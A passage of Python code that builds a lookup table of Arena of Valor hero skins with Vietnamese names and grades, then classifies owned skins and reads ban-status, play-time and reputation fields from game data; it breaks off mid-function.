13206: Hayate Kim ưng sát thủ (Hayate)
13208: Hayate Bạch vô thường (Hayate)
13209: Hayate Bóng người dưới trăng (Hayate)
13211: Hayate Mãnh hổ kim cang (Hayate)
13304: Valhein Đại Công Tước (Valhein)
13308: Valhein Cá mập "nghiêm túc" (Valhein)
13309: Valhein Hoàng tử Băng (Valhein)
13310: Valhein Thần tài (Valhein)
13404: Skud Tà linh ma tướng (Skud)
13504: Thane Mật vụ (Thane)
13602: Ilumia Thần mặt trời (Ilumia)
13603: Ilumia Hồng Hoa Hậu (Ilumia)
13604: Ilumia Thiên nữ áo dài (Ilumia)
13611: Ilumia Thụy Mộc liên hoa (Ilumia)
13703: Paine Công tước máu (Paine)
13704: Paine Ô Thước Đại hiệp (Paine)
13903: Kil'Groth Chú lính chì (Kil'Groth)
14002: Superman Bất Công Lý (Superman)
14102: Lauriel Hỏa Phượng Hoàng (Lauriel)
14105: Lauriel Hoa khôi Giáng sinh (Lauriel)
14106: Lauriel Lạc thần (Lauriel)
14108: Lauriel Tiệc bãi biển (Lauriel)
14114: Lauriel Nữ vương học đường (Lauriel)
14115: Lauriel Đôi cánh Nguyệt thực (Lauriel)
14201: Natalya Mị muốn đi chơi (Natalya)
14204: Natalya Phó nháy nhí nhảnh (Natalya)
14207: Natalya Băng tâm thần nữ (Natalya)
14208: Natalya nữ quái công nghệ (Natalya)
14209: Natalya Nghệ sĩ ma mị (Natalya)
14212: Natalya Băng lam nữ soái (Natalya)
14401: Taara Đại tù trưởng (Taara)
14402: Taara Lam Hải chiến nữ (Taara)
14403: Taara Hỏa Ngọc Nữ Đế (Taara)
14405: Taara Hồng môn đường chủ (Taara)
14602: Zill Dung nham (Zill)
14603: Zill Cựu thần thiên hà (Zill)
14604: Zill Diệt nguyệt tử sĩ (Zill)
14606: Zill Phong thần Tu La (Zill)
14802: Preyta Băng Hỏa Long Sư (Preyta)
14904: Xeniel Ma sứ tận thế (Xeniel)
14905: Xeniel Tổng lãnh tinh hệ (Xeniel)
15001: Nakroth Chiến Binh Hỏa Ngục (Nakroth)
15003: Nakroth BBoy công nghệ (Nakroth)
15008: Nakroth Tiệc Bãi Biển (Nakroth)
15014: Nakroth Producer Tia chớp (Nakroth)
15205: Điêu Thuyền Hoa Hậu (Điêu Thuyền)
15208: Điêu Thuyền Tà linh pháp trượng (Điêu Thuyền)
15209: Điêu Thuyền Mèo công nghệ (Điêu Thuyền)
15210: Điêu Thuyền Thần Ngọc (Điêu Thuyền)
15302: Kaine Dơi Địa Ngục (Kaine)
15305: Kaine Thiếu chủ bóng đêm (Kaine)
15306: Kaine Thợ săn chính nghĩa (Kaine)
15402: Yena Thỏ may mắn (Yena)
15403: Yena Chiến binh nguyệt tộc (Yena)
15407: Yena Giảng viên tình ái (Yena)
15410: Yena Vũ điệu Giáng sinh (Yena)
15603: Aleister Quỷ soái nguyệt tộc (Aleister)
15604: Aleister siêu sao bóng rổ (Aleister)
15607: Aleister Âm dương sư (Aleister)
15610: Aleister Mật vụ thần thám (Aleister)
15703: Raz Băng Quyền Quán Quân (Raz)
15706: Raz Siêu cấp tin tặc (Raz)
15708: Raz Mãnh lôi thần quyền (Raz)
15901: Dolia Hoa tiêu đại dương (Dolia)
16202: Kriknak Yêu trùng cổ mộ (Kriknak)
16205: Kriknak Tử trùng DDoS (Kriknak)
16302: Ryoma Đại Tướng Nguyệt Tộc (Ryoma)
16303: Ryoma Thanh long bang chủ (Ryoma)
16306: Ryoma Chiến binh Cyborg (Ryoma)
16308: Ryoma Đặc nhiệm Giáng sinh (Ryoma)
16605: Arthur Đặc cảnh băng lôi (Arthur)
16606: Arthur Hiệp sĩ trăng khuyết (Arthur)
16611: Arthur Băng lam kiếm vệ (Arthur)
16702: Ngộ Không Hỏa Nhãn Kim Tinh (Ngộ Không)
16704: Ngộ Không Ngộ Khá Trẩu (Ngộ Không)
16706: Ngộ Không Đặc vụ băng hầu (Ngộ Không)
16708: Ngộ Không Tề Thiên ma hầu (Ngộ Không)
16803: Lumburr Cự thần viễn cổ (Lumburr)
16902: Slimz Chú thỏ ngọc (Slimz)
17002: Moren Lính cứu hỏa (Moren)
17102: Cresht Cá Cắn Cáp (Cresht)
17103: Cresht Đại sư sushi (Cresht)
17303: Fennik Tiệc Bánh Kẹo (Fennik)
17305: Fennik Phi hành gia (Fennik)
17308: Fennik Phi hồ ẩn sĩ (Fennik)
17311: Fennik Cáo chiêu tài (Fennik)
17402: Stuart Vua hề (Stuart)
17404: Stuart Đêm kinh hoàng (Stuart)
17407: Stuart Dạ Xoa thiếu chủ (Stuart)
17501: Grakk Thuyền Trưởng Râu Đỏ (Grakk)
17504: Grakk Đi vào lòng đất (Grakk)
17505: Grakk Mèo "thần tài" (Grakk)
17507: Grakk Tiệc bãi biển (Grakk)
17512: Grakk Cận vệ Mafia (Grakk)
17519: Grakk Ngũ Cốc Phong Đăng (Grakk)
17702: Lindis Quang thánh tiễn (Lindis)
17704: Lindis Nữ vương pháo hoa (Lindis)
17708: Lindis Đặc vụ thần thám (Lindis)
18004: Max Thần đồng sinh hóa (Max)
18405: Helen Hồng Liên tiên tử (Helen)
18406: Helen Xứ sở diệu kỳ (Helen)
18606: Teemee Tanuki chiêu tài (Teemee)
18703: Arum Linh tượng vu nữ (Arum)
18705: Arum Thỏ may mắn (Arum)
18709: Arum Bạn muốn hẹn hò? (Arum)
18714: Arum Ký Ức Đại Dương (Arum)
19010: Tulen Hoả thần long tộc (Tulen)
19011: Tulen Đại úy Athanor (Tulen)
19102: Rouie Công chúa hỏa long (Rouie)
19108: Rouie Thụy mộc Thanh Long (Rouie)
19202: Celica Đếm cừu (Celica)
19302: Amily Đặc công nhện đỏ (Amily)
19303: Amily Thư ký (Amily)
19304: Amily Thỏ may mắn (Amily)
19305: Amily Võ thần thiên hà (Amily)
19312: Amily Thám tử trung học (Amily)
19502: Enzo Chiến binh trăng khuyết (Enzo)
19505: Enzo Hồng hạc thị vệ (Enzo)
19604: Elsu Chiến binh bóng tối (Elsu)
19611: Elsu Hỏa diệm Chu Tước (Elsu)
19904: Eland'orr Siêu Thám Tử (Eland'orr)
19905: Eland'orr Chú ong bay cao (Eland'orr)
19907: Eland'orr Uyên Ương Mộng Điệp (Eland'orr)
50102: Tel'Annas Giám thị thân thiện (Tel'Annas)
50106: Tel'annas Cẩm y vệ: Phi Ưng (Tel'Annas)
50110: Tel'Annas Công chúa mộng mơ (Tel'Annas)
50116: Tel'Annas Ô Thước Tiên nữ (Tel'Annas)
50120: Tel'Annas Kỷ Nguyên Hổ Phách (Tel'Annas)
50202: Astrid Siêu sao bóng chày (Astrid)
50303: Zuka Giáo Sư Sừng Sỏ (Zuka)
50305: Zuka Gấu Nhồi Bông (Zuka)
50306: Zuka Diệt nguyệt nguyên soái (Zuka)
50308: Zuka Mãnh hổ (Zuka)
50309: Zuka Rapper Big Panda (Zuka)
50311: Zuka Xích Hùng Chiến Giáp (Zuka)
50502: Baldum Liệt hỏa dung nham (Baldum)
50602: Omen Ám tử đao (Omen)
50603: Omen Quỷ nguyệt tướng (Omen)
50605: Omen Chiến binh trăng khuyết (Omen)
50607: Omen Nhạc sĩ huyền thoại (Omen)
50608: Omen Quái Kiệt Guitar (Omen)
50610: Omen Huyết ảnh Tà thần (Omen)
50611: Omen Chiến xa hắc ám (Omen)
50612: Omen Chiến xa quang minh (Omen)
50701: Flash Tia chớp tương lai (Flash)
50803: Wisp Ếch nhồi bông (Wisp)
50805: Wisp Máy phát quà (Wisp)
51002: Liliana thần tượng âm nhạc (Liliana)
51006: Liliana Nữ thần F1 (Liliana)
51007: Liliana Tiệc bãi biển (Liliana)
51014: Lilianna Thần hổ Xiêm La (Liliana)
51202: Rourke Biệt đội siêu hùng (Rourke)
51302: Zata Sứ giả tinh hệ (Zata)
51303: Zata Thần mặt trời (Zata)
51502: Richter Thống soái kháng chiến (Richter)
51803: Quillen Thống soái đế chế (Quillen)
51804: Quillen Huyết thủ nguyệt tộc (Quillen)
51806: Quillen Tà linh ma đao (Quillen)
51807: Quillen Hoàng Kim Soái Vương (Quillen)
51809: Quillen Người gác đền (Quillen)
51810: Quillen Giám đốc âm nhạc (Quillen)
51903: Annette Thần tượng âm nhạc (Annette)
51904: Annette Tiệc bãi biển (Annette)
51905: Annette Phi hành gia (Annette)
51908: Annette Chị ong bay thấp (Annette)
51912: Annette Doombot thơ ngây (Annette)
52002: Veres Gián điệp tinh hệ (Veres)
52006: Veres Thuỷ thần kiều diễm (Veres)
52009: Veres Tiệc bãi biển (Veres)
52010: Veres Men Lam Hồn Gốm (Veres)
52013: Veres Thỏ may mắn (Veres)
52102: Florentino Giám sát tinh hệ (Florentino)
52106: Florentino Tà long kiếm sĩ (Florentino)
52111: Florentino Hỏa diệm Thần Long (Florentino)
52202: Errol Diệt nguyệt tiên phong (Errol)
52205: Errol Huyết thủ Tu La (Errol)
52207: Errol Stream đến bao giờ? (Errol)
52302: D'arcy Đô đốc tinh hệ (D'Arcy)
52303: D'arcy Pháp sư hỏa long (D'Arcy)
52304: D'Arcy Tiến sĩ thiên tài (D'Arcy)
52402: Capheny Thần tượng âm nhạc (Capheny)
52403: Capheny Toán Hóa Sinh (Capheny)
52405: Capheny Siêu cấp tin tặc (Capheny)
52406: Capheny Phi hành gia (Capheny)
52408: Capheny Quân Nhạc Mildar (Capheny)
52602: Ishar Tiểu thư kẹo ngọt (Ishar)
52605: Ishar Gián điệp hacker (Ishar)
52608: Ishar Rồng bé bự (Ishar)
52702: Sephera Chiêm tinh gia (Sephera)
52703: Sephera Thần tượng âm nhạc (Sephera)
52706: Sephera Lam Hải phu nhân (Sephera)
52802: Qi Đặc vụ cáo tuyết (Qi)
52806: Qi Búp bê Daruma (Qi)
52902: Volkath Ma kỵ tử sĩ (Volkath)
52903: Volkath Xung thiên thần tướng (Volkath)
52905: Volkath Chiến thần Ai Cập (Volkath)
53002: Dirak Pháp sư trăng khuyết (Dirak)
53103: Keera Sát thủ bí ngô (Keera)
53105: Keera Tiệc bãi biển (Keera)
53202: Thorne Giả kim thuật sư (Thorne)
53204: Thorne Tiệc bãi biển (Thorne)
53207: Thorne Thám tử trung học (Thorne)
53302: Laville Tay súng diệt thần (Laville)
53305: Laville Kim quy thần vương (Laville)
53306: Laville Tiệc bãi biển (Laville)
53402: Dextra Quận chúa Tuyết (Dextra)
53405: Dextra Băng Sa công chúa (Dextra)
53502: Sinestrea Tiểu thư băng giá (Sinestrea)
53504: Sinestra Điệp viên cánh cụt (Sinestrea)
53605: Aoi Lam Hải quận chúa (Aoi)
53606: Aoi Tiểu thư Mafia (Aoi)
53704: Allain Thần mặt trời (Allain)
53705: Allain Bạch kiếm sĩ (Allain)
53706: Allain Hạo thiên khuyển (Allain)
53707: Allain Tình yêu nổi loạn (Allain)
53802: Iggy Thần Miêu thiếu chủ (Iggy)
53902: Lorion Hoả vân tà thần (Lorion)
53903: Lorion Quân vương bóng tối (Lorion)
53904: Lorion Quân vương ánh sáng (Lorion)
54004: Bright Mật vụ hacker (Bright)
54101: Bonnie Thỏ ma quái (Bonnie)
54102: Bonnie Cô bé sợ ma (Bonnie)
54202: Tachi Đao khách vô tình (Tachi)
54203: Tachi Xích long hỏa diệm (Tachi)
54303: Aya MC Sóc nhỏ (Aya)
54308: Aya Hỏa Hồ Tiên Ngư (Aya)
54401: Yan nhà chế tác (Yan)
54403: Yan Công tước Norman (Yan)
54404: Yan Giấc mơ sao (Yan)
54405: Yan Bích Hạc Phiên Vân (Yan)
54503: Yue Chiêm Tinh gia (Yue)
54504: Yue Vũ phiến hỏa diệm (Yue)
54601: Teeri Tiểu kì lân (Teeri)
54602: Teeri Minh tinh ảo thuật (Teeri)
54603: Teeri Thuyền trưởng song luân (Teeri)
54607: Teeri Vân Y Cẩm Tú (Teeri)
54801: Bijan Chiến binh sa mạc (Bijan)
56701: Erin Mộc tinh linh (Erin)
59701: Biron Võ sĩ Giác đấu (Biron)

========== Others (325) ==========
10500: Mặc định (Toro)
10504: Toro Ngưu hải vương (Toro)
10507: Toro Hiểm họa hỗn mang (Toro)
10600: Mặc định (Krixi)
10617: Krixi Quán quân (Krixi)
10621: Krixi Uyên Ương Mộng Điệp (Krixi)
10700: Mặc định (Zephys)
10712: Zephys Nghệ nhân đồ chơi (Zephys)
10800: Mặc định (Gildur)
10900: Mặc định (Veera)
10903: Veera Nàng dơi tuyết (Veera)
10914: Veera Phù thủy Hội họa (Veera)
11000: Mặc định (Kahlii)
11008: Kahlii Robot Hộ lý (Kahlii)
11010: Kahlii Linh Hoa thần nữ (Kahlii)
11100: Mặc định (Violet)
11101: Violet Nữ Hoàng Pháo Hoa (Violet)
11104: Violet Mèo Siêu Quậy (Violet)
11108: Violet Pháo hoa Neon Tuyệt sắc (Violet)
11200: Mặc định (Yorn)
11214: Yorn Ký giả diệu kỳ (Yorn)
11216: Yorn Thương nhân Sa mạc (Yorn)
11300: Mặc định (Chaugnar)
11303: Chaugnar Quang Vinh (Chaugnar)
11307: Chaugnar Ác Mộng Arcade (Chaugnar)
11400: Mặc định (Omega)
11405: Omega Hộ vệ Carano (Omega)
11407: Omega Samurai cơ hóa (Omega)
11500: Mặc định (Jinna)
11506: Jinna Kim Giác (Jinna)
11507: Jinna Ma Thuật sĩ (Jinna)
11600: Mặc định (Butterfly)
11601: Butterfly Xuân nữ ngổ ngáo (Butterfly)
11606: Butterfly Đông êm đềm (Butterfly)
11620: Butterfly Bình minh tận thế (Butterfly)
11700: Mặc định (Ormarr)
11703: Ormarr Thông Thỏa Thích (Ormarr)
11707: Ormarr Quỷ vệ (Ormarr)
11800: Mặc định (Alice)
11817: Alice Ốc quế tinh nghịch (Alice)
11818: Alice Tiên nữ mộng giới (Alice)
11900: Mặc định (Mganga)
11907: Mganga Đèn Thần Hậu Đậu (Mganga)
12000: Mặc định (Mina)
12001: Mina Tiểu thư đoạt hồn (Mina)
12004: Mina Kẹo hay ghẹo (Mina)
12011: Mina Xích Huyết Diễm Quỷ (Mina)
12012: Mina Cẩm y vệ Kim Ô (Mina)
12100: Mặc định (Marja)
12300: Mặc định (Maloch)
12305: Maloch Ông kẹ bí ngô (Maloch)
12400: Mặc định (Ignis)
12402: Ignis Quang Vinh (Ignis)
12600: Mặc định (Arduin)
12602: Arduin Quang Vinh (Arduin)
12700: Mặc định (Azzen'Ka)
12702: Azzen'Ka Linh Hồn Lữ Khách (Azzen'Ka)
12705: Azzen'ka Quang Vinh 2.0 (Azzen'Ka)
12800: Mặc định (Lữ Bố)
12803: Lữ Bố Long Kỵ Sĩ (Lữ Bố)
12900: Mặc định (Triệu Vân)
12904: Triệu Vân Dũng Sĩ Đồ Long (Triệu Vân)
12905: Triệu Vân Quang Vinh (Triệu Vân)
13000: Mặc định (Airi)
13009: Airi Mỵ Hồ (Airi)
13012: Airi Lễ hội mùa xuân (Airi)
13018: Airi Búp bê Mộng mị (Airi)
13019: Airi Quản lý tài năng (Airi)
13100: Mặc định (Murad)
13105: Murad Thiên Tài Sân Cỏ (Murad)
13114: Murad S-Quang Vinh (Murad)
13117: Murad Chiến binh đồ chơi (Murad)
13119: Murad Thần Pháo hoa (Murad)
13200: Mặc định (Hayate)
13203: Hayate Ngân lang (Hayate)
13300: Mặc định (Valhein)
13305: Valhein Quang Vinh (Valhein)
13306: Valhein Số 7 Thần Sầu (Valhein)
13307: Valhein Khiêu chiến (Valhein)
13311: Valhein Xạ thần Kagutsuchi (Valhein)
13312: Valhein S-Quang Vinh (Valhein)
13400: Mặc định (Skud)
13403: Skud Quang Vinh (Skud)
13410: Skud Quái thần thủy vực (Skud)
13500: Mặc định (Thane)
13503: Thane Quang vinh (Thane)
13506: Thane Khoảnh khắc vinh quang (Thane)
13600: Mặc định (Ilumia)
13608: Ilumia Quý cô Nhà hát (Ilumia)
13610: Ilumia Trọng tài (Ilumia)
13614: Ilumia Hải nữ Oán linh (Ilumia)
13700: Mặc định (Paine)
13900: Mặc định (Kil'Groth)
13902: Kil'Groth Quang Vinh (Kil'Groth)
13904: Kil'Groth Càn Nguyên thủ vệ (Kil'Groth)
13905: Kil'Groth Hung thần biển sâu (Kil'Groth)
14000: Mặc định (Superman)
14100: Mặc định (Lauriel)
14103: Lauriel Phù Thủy Bí Ngô (Lauriel)
14200: Mặc định (Natalya)
14202: Natalya Nghệ nhân lân (Natalya)
14205: Natalya Quà Quái Quỷ (Natalya)
14210: Natalya Thần Phú Quý (Natalya)
14400: Mặc định (Taara)
14600: Mặc định (Zill)
14800: Mặc định (Preyta)
14803: Preyta Phi cơ F1 (Preyta)
14900: Mặc định (Xeniel)
14902: Xeniel Trung Vệ Thép (Xeniel)
14910: Xeniel Tay trống ngang tàng (Xeniel)
14911: Xeniel Cấm vệ (Xeniel)
15000: Mặc định (Nakroth)
15005: Nakroth Khiêu chiến (Nakroth)
15006: Nakroth Quán quân (Nakroth)
15033: Nakroth Siêu Việt (Nakroth)
15200: Mặc định (Điêu Thuyền)
15204: Điêu Thuyền WaVe (Điêu Thuyền)
15206: Điêu Thuyền Phù thủy bí ngô (Điêu Thuyền)
15300: Mặc định (Kaine)
15400: Mặc định (Yena)
15406: Yena Dạ nguyệt thánh nữ (Yena)
15409: Yena WaVe (Yena)
15414: Yena Thần Sứ kiều diễm (Yena)
15415: Yena Hoa tiêu mộng giới (Yena)
15600: Mặc định (Aleister)
15602: Aleister Quang Vinh (Aleister)
15612: Aleister Ác nhân đồ chơi (Aleister)
15614: Aleister S-Quang vinh (Aleister)
15700: Mặc định (Raz)
15900: Mặc định (Dolia)
16200: Mặc định (Kriknak)
16203: Kriknak ST.L-162 (Kriknak)
16300: Mặc định (Ryoma)
16309: Ryoma Khiêu chiến (Ryoma)
16313: Ryoma Thống lãnh quỷ binh (Ryoma)
16600: Mặc định (Arthur)
16609: Arthur Tôn Hổ vô song (Arthur)
16700: Mặc định (Ngộ Không)
16707: Ngộ Không Nhóc tỳ bá đạo (Ngộ Không)
16800: Mặc định (Lumburr)
16900: Mặc định (Slimz)
16910: Slimz Linh Hoa đạo sĩ (Slimz)
16911: Slimz Thỏ săn ác mộng (Slimz)
17000: Mặc định (Moren)
17005: Moren Thợ cắt cáp (Moren)
17100: Mặc định (Cresht)
17107: Cresht Caesar bão tố (Cresht)
17300: Mặc định (Fennik)
17304: Fennik Tuần Lộc Láu Lỉnh (Fennik)
17307: Fennik Shipper Siêu thanh (Fennik)
17310: Fennik Rối Gỗ Tinh Quái (Fennik)
17400: Mặc định (Stuart)
17500: Mặc định (Grakk)
17503: Grakk Chàng gấu tuyết (Grakk)
17517: Grakk Thần ẩm thực (Grakk)
17518: Grakk Thủ vệ Dạ Ưng (Grakk)
17700: Mặc định (Lindis)
17703: Lindis Quang Vinh (Lindis)
17709: Lindis Linh Hoa thần nữ (Lindis)
18000: Mặc định (Max)
18002: Max Găng Tay Vàng (Max)
18003: Max Quang Vinh (Max)
18008: Max "Không trêu bạn" (Max)
18400: Mặc định (Helen)
18401: Helen Cảnh vệ rừng (Helen)
18402: Helen Nghìn lẻ một đêm (Helen)
18404: Helen Hotgirl Trà sữa (Helen)
18407: Helen Cổ tích Biển xanh (Helen)
18409: Helen Trợ lý nghệ sĩ (Helen)
18600: Mặc định (Teemee)
18603: Teemee Tay đua siêu tốc (Teemee)
18609: Teemee Lẩu nấm (Teemee)
18700: Mặc định (Arum)
18708: Arum Quản lý tài năng (Arum)
18712: Arum Thần phong Thống lĩnh (Arum)
18900: Mặc định (Krizzix)
18905: Krizzix Trưởng lão (Krizzix)
19000: Mặc định (Tulen)
19003: Tulen Phù Thủy Kiến Tạo (Tulen)
19004: Tulen Đông êm đềm (Tulen)
19100: Mặc định (Rouie)
19106: Rouie Quang Vinh (Rouie)
19200: Mặc định (Celica)
19203: Celica S-Quang Vinh (Celica)
19206: Celica Vịt lướt bọt biển (Celica)
19207: Celica Ảo thuật gia (Celica)
19300: Mặc định (Amily)
19306: Amily Hội ám hoàng (Amily)
19500: Mặc định (Enzo)
19510: Enzo Cá heo bảnh chọe (Enzo)
19511: Enzo Shinobi Đoạt mệnh (Enzo)
19600: Mặc định (Elsu)
19603: Elsu Guitar tình ái (Elsu)
19607: Elsu Xạ thủ tinh linh (Elsu)
19613: Elsu DJ (Elsu)
19614: Elsu Xạ thần mộng giới (Elsu)
19900: Mặc định (Eland'orr)
20600: Mặc định (Charlotte)
50100: Mặc định (Tel'Annas)
50103: Tel'Annas Chung Tình Tiễn (Tel'Annas)
50114: Tel'Annas Quang Vinh (Tel'Annas)
50200: Mặc định (Astrid)
50206: Astrid Thần Trí Tuệ (Astrid)
50300: Mặc định (Zuka)
50304: Zuka Phát Tài (Zuka)
50310: Zuka Ngư ông đắc lợi (Zuka)
50400: Mặc định (Wonder Woman)
50500: Mặc định (Baldum)
50506: Baldum Sói Quàng Khăn Đỏ (Baldum)
50600: Mặc định (Omen)
50700: Mặc định (Flash)
50800: Mặc định (Wisp)
50802: Wisp Thỏ siêu quậy (Wisp)
50809: Wisp Tiểu Ronin (Wisp)
50900: Mặc định (Y'bneth)
50905: Y'bneth Titan Băng giá (Y'bneth)
51000: Mặc định (Liliana)
51009: Liliana WaVe (Liliana)
51015: Liliana Ma Pháp Tối Thượng (Liliana)
51100: Mặc định (Ata)
51103: Ata Quang vinh (Ata)
51108: Ata Gà mờ (Ata)
51200: Mặc định (Rourke)
51207: Rourke Cảnh sát trưởng (Rourke)
51209: Rourke Thánh Vệ (Rourke)
51300: Mặc định (Zata)
51304: Zata Khiêu chiến (Zata)
51305: Zata Tác gia đương đại (Zata)
51307: Zata Xích Huyết Bá Tước (Zata)
51308: Zata Idol Giáng Sinh (Zata)
51400: Mặc định (Roxie)
51402: Roxie kèn ái tình (Roxie)
51406: Roxie Lễ hội hoa (Roxie)
51408: Roxie Hỏa thuật sư (Roxie)
51409: Roxie "Bạch Tuyết" Kỳ Lạ (Roxie)
51500: Mặc định (Richter)
51505: Richter Quang vinh 2.0 (Richter)
51509: Richter Tổng Lãnh thiên thần (Richter)
51800: Mặc định (Quillen)
51900: Mặc định (Annette)
52000: Mặc định (Veres)
52008: Veres Phù thủy trang điểm (Veres)
52014: Veres Idol Giáng Sinh (Veres)
52100: Mặc định (Florentino)
52108: Florentino Bá vương âm nhạc (Florentino)
52112: Florentino S-Quang Vinh (Florentino)
52200: Mặc định (Errol)
52209: Errol Dị nhân tinh hệ (Errol)
52210: Errol Dũng sĩ Pixel (Errol)
52300: Mặc định (D'Arcy)
52306: D'Arcy Tông đồ Chân lý (D'Arcy)
52400: Mặc định (Capheny)
52410: Capheny Tử đinh hương (Capheny)
52411: Capheny Vua trò chơi (Capheny)
52412: Capheny S-Quang Vinh (Capheny)
52500: Mặc định (Zip)
52508: Zip Tiểu quái gánh xiếc (Zip)
52600: Mặc định (Ishar)
52611: Ishar Đoàn trưởng tạp kỹ (Ishar)
52700: Mặc định (Sephera)
52800: Mặc định (Qi)
52803: Qi Quán quân (Qi)
52804: Qi Thiếu nữ mùa xuân (Qi)
52805: Qi Blogger Ẩm thực (Qi)
52808: Qi Thần phong Hiệp nữ (Qi)
52900: Mặc định (Volkath)
52906: Volkath Hắc kỵ thời không (Volkath)
52907: Volkath S - Quang vinh (Volkath)
53000: Mặc định (Dirak)
53003: Dirak Quý tộc (Dirak)
53005: Dirak Ông bầu Showbiz (Dirak)
53007: Dirak Đường chủ yêu giới (Dirak)
53100: Mặc định (Keera)
53111: Keera Môn đồ xảo quyệt (Keera)
53112: Keera Quán quân (Keera)
53200: Mặc định (Thorne)
53203: Thorne Quán quân (Thorne)
53300: Mặc định (Laville)
53303: Laville Tay súng vô địch (Laville)
53308: Laville Chiến thần MOBA (Laville)
53311: Laville Thợ Săn Truy Ảnh (Laville)
53312: Laville S-Quang vinh (Laville)
53400: Mặc định (Dextra)
53407: Dextra Đảo thiên đường (Dextra)
53500: Mặc định (Sinestrea)
53503: Sinestrea WaVe (Sinestrea)
53510: Sinestrea Giấc mộng biển xanh (Sinestrea)
53511: Sinestrea S-Quang vinh (Sinestrea)
53512: Sinestrea Nữ quỷ say ngủ (Sinestrea)
53600: Mặc định (Aoi)
53602: Aoi Hoàng kim công chúa (Aoi)
53608: Aoi Sát thủ Dạ Ưng (Aoi)
53609: Aoi Quán quân (Aoi)
53700: Mặc định (Allain)
53708: Allain Lân sư Vũ thần (Allain)
53709: Allain Cẩm y vệ Xích Hổ (Allain)
53800: Mặc định (Iggy)
53805: Iggy Tiếng thét Hỗn mang (Iggy)
53900: Mặc định (Lorion)
53905: Lorion Giáo chủ tinh hệ (Lorion)
54000: Mặc định (Bright)
54003: Bright Khiêu chiến (Bright)
54007: Bright Vua về nhì (Bright)
54100: Mặc định (Bonnie)
54104: Bonnie S-Quang vinh (Bonnie)
54105: Bonnie Tân binh Pixel (Bonnie)
54200: Mặc định (Tachi)
54204: Tachi S-Vinh Quang (Tachi)
54205: Tachi Thần phong Hộ vệ (Tachi)
54300: Mặc định (Aya)
54302: Aya Điệp viên ký ức (Aya)
54400: Mặc định (Yan)
54500: Mặc định (Yue)
54505: Yue Nữ hoàng Băng giá (Yue)
54600: Mặc định (Teeri)
54605: Teeri Ốc quế ngọt ngào (Teeri)
54800: Mặc định (Bijan)
54803: Bijan Đập vỡ Cây đàn (Bijan)
54806: Bijan Giai điệu Giáng Sinh (Bijan)
56700: Mặc định (Erin)
56800: Mặc định (Ming)
59500: Mặc định (Edras)
59700: Mặc định (Biron)
59800: Mặc định (Bolt Baron)
59900: Mặc định (Billow)
"""

SKIN_DB = {}

def _init_skin_db():
    current_grade = "Other"
    for line in RAW_SKIN_DATA.strip().split('\n'):
        line = line.strip()
        if not line: continue
        if line.startswith("=========="):
            if "SSS" in line: current_grade = "SSS"
            elif "SS" in line: current_grade = "SS"
            elif "Anime" in line: current_grade = "Anime"
            elif " S " in line or "(S)" in line or line.startswith("========== S "): current_grade = "S"
            else: current_grade = "Other"
            continue
        if ":" in line:
            sid, name_raw = line.split(":", 1)
            sid = sid.strip()
            name = name_raw.strip()
            name = re.sub(r'\s*\([^)]+\)$', '', name)
            SKIN_DB[sid] = {"name": name, "grade": current_grade}

_init_skin_db()

def classify_skin_from_db(skin_id):
    sid = str(skin_id)
    if sid in SKIN_DB:
        return SKIN_DB[sid]["grade"]
    return "Other"

def _classify_skins(owned_ids):
    s_list, ss_list, sss_list, anime_list, other_list = [], [], [], [], []
    prefixes = set()
    for item_id in owned_ids:
        sid = str(item_id)
        has_name = sid in SKIN_DB
        name = SKIN_DB[sid]["name"] if has_name else ""
        cat = classify_skin_from_db(sid)
        if cat == 'S': s_list.append(name) if name else s_list.append("")
        elif cat == 'SS': ss_list.append(name) if name else ss_list.append("")
        elif cat == 'SSS': sss_list.append(name) if name else sss_list.append("")
        elif cat == 'Anime': anime_list.append(name) if name else anime_list.append("")
        elif cat == 'Other': other_list.append(name) if name else other_list.append("")
        prefix = sid[:3]
        prefixes.add(prefix)
    return {
        'total_skins': len(owned_ids),
        'total_champs': len(prefixes),
        's': len(s_list), 's_list': [n for n in s_list if n],
        'ss': len(ss_list), 'ss_list': [n for n in ss_list if n],
        'sss': len(sss_list), 'sss_list': [n for n in sss_list if n],
        'anime': len(anime_list), 'anime_list': [n for n in anime_list if n],
        'other': len(other_list), 'other_list': [n for n in other_list if n],
    }

# ======================= HELPER FUNCTIONS ==================================
def _is_banned_info(payload):
    for item in payload:
        if isinstance(item, dict):
            for key, val in item.items():
                if key in ('isBan','isBanned','banned','ban','banStatus','status','state','endTime','banEndTime','unbanTime','expireAt','expiredAt','banTime'):
                    if val:
                        if isinstance(val, bool) and val:
                            return True
                        if isinstance(val, (int, float)) and val > 0:
                            return True
                        if isinstance(val, str) and val.lower() in ('yes','true','1','banned','ban'):
                            return True
    return False

def _is_yes(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().upper() in {"YES", "Y", "TRUE", "1", "ON", "BAN", "BANNED"}
    return False

def _extract_aov_activity(recent_games, player):
    import datetime as _dt
    play_keys = {
        'lastplaytime', 'lastplayedat', 'lastgametime', 'lastmatchtime',
        'latestmatchtime', 'matchtime', 'playedat', 'gametime', 'battleendtime',
    }
    reputation_keys = {
        'reputation', 'reputationscore', 'reputationvalue',
        'credibility', 'credibilityscore', 'credibilityvalue',
        'creditability', 'creditabilityscore', 'creditabilityvalue',
        'behaviorcredit', 'behaviorcreditscore', 'creditscore', 'creditpoint',
        'honor', 'honorscore', 'honorpoint', 'honorvalue',
        'uytin', 'diemuytin',
    }
    game_keys = {'game', 'gamename', 'game_name', 'gameid', 'game_id', 'appid', 'app_id', 'title'}
    aov_markers = {'aov', 'arena of valor', 'lien quan', 'liên quân', 'moba', str(LIEN_QUAN_APP_ID)}

    def _key(value):
        return re.sub(r'[^a-z0-9]', '', str(value).lower())

    def _is_aov_record(obj):
        for k, value in obj.items():
            if str(k).lower() not in game_keys:
                continue
            text = str(value).strip().lower()
            if any(marker in text for marker in aov_markers):
                return True
        return False

    def _timestamp(value):
        try:
            if isinstance(value, (int, float)) or str(value).strip().replace('.', '', 1).isdigit():
                number = float(value)
                if number > 10_000_000_000:
                    number /= 1000
                dt = _dt.datetime.fromtimestamp(number, _dt.timezone.utc)
            elif isinstance(value, str):
                text = value.strip().replace('Z', '+00:00')
                dt = _dt.datetime.fromisoformat(text)
                if dt.tzinfo is None:
                    dt = dt.replace(tzinfo=_dt.timezone.utc)
            else:
                return None
            if dt.year < 2010 or dt.year > 2100:
                return None
            return dt
        except (TypeError, ValueError, OSError, OverflowError):
            return None

    latest = None
    latest_match = None
    reputation = None

    def _walk(value, aov_context=False):
        nonlocal latest, latest_match, reputation
        if isinstance(value, dict):
